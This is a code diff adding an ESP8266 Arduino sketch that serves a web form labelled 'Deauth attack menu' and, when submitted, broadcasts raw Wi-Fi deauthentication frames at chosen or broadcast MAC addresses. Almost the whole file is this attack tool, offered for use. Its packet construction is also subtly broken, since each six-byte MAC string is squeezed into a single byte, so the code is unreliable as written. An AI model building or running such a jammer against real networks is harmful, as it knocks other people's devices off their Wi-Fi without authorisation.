@@ -1,0 +1,78 @@
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+
+ESP8266WebServer server(80);
+
+const char* ssid = "ESPweb";
+const char* password = "werqzxc";
+
+String macvar = "0x00, 0x00, 0x00, 0x00, 0x00, 0x00";
+uint8_t macvarpacket = (uint8_t)macvar.toInt();
+String destinationvar = "0xff, 0xff, 0xff, 0xff, 0xff, 0xff";
+uint8_t destinationvarpacket = (uint8_t)destinationvar.toInt();
+
+void setup() {
+  Serial.begin(9600);
+  delay(100);
+
+  WiFi.softAP(ssid, password);
+  WiFi.mode(WIFI_AP_STA);
+  Serial.println(WiFi.softAPIP());
+
+  server.on("/", HTTP_GET, [](){
+    String html = "<html><body>";
+    html += "<h1>Deauth attack menu: </h1>";
+    html += "<form action='/update' method='POST'>";
+    html += "MAC Address: <input type='text' name='macvar' value='" + macvar + "'><br>";
+    html += "Destination: <input type='text' name='destinationvar' value='" + destinationvar + "'><br>";
+    html += "<input type='submit' value='Update'>";
+    html += "</form>";
+    html += "<h3>Note: 0xff, 0xff, 0xff, 0xff, 0xff, 0xff = broadcast</h3>";
+    html += "</body></html>";
+    server.send(200, "text/html", html); 
+  });
+
+  server.on("/update", HTTP_POST, [](){
+    if (server.hasArg("macvar") && (server.hasArg("destinationvar")))  {
+      macvar = server.arg("macvar"); 
+      destinationvar = server.arg("destinationvar");
+      Serial.print("variable change: ");
+      Serial.println(macvar);
+      Serial.println(destinationvar);
+      deauthattack();
+    }
+    
+    server.sendHeader("Location", "/");
+    server.send(303);  
+  });
+
+  
+  server.begin();
+}
+
+void loop() {
+  server.handleClient();  
+}
+
+uint8_t deauthPacket[26] = {
+
+  0xc0, 0x00, 0x3a, 0x01,                         // Frame Control, Duration
+  destinationvarpacket,                           // Destination
+  macvarpacket,                                   // Source 
+  macvarpacket,                                   // BSSID 
+  0x00, 0x00,                                     // Fragment & Sequence Number
+  0x07, 0x00                                      // Reason code
+};
+
+void deauthattack()
+{
+  wifi_promiscuous_enable(1);
+
+  Serial.println("sending...");
+  for (int i = 0; i < 50; i++) {
+    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
+    delay(10);
+  }
+
+  Serial.println("deauth sent.");
+}
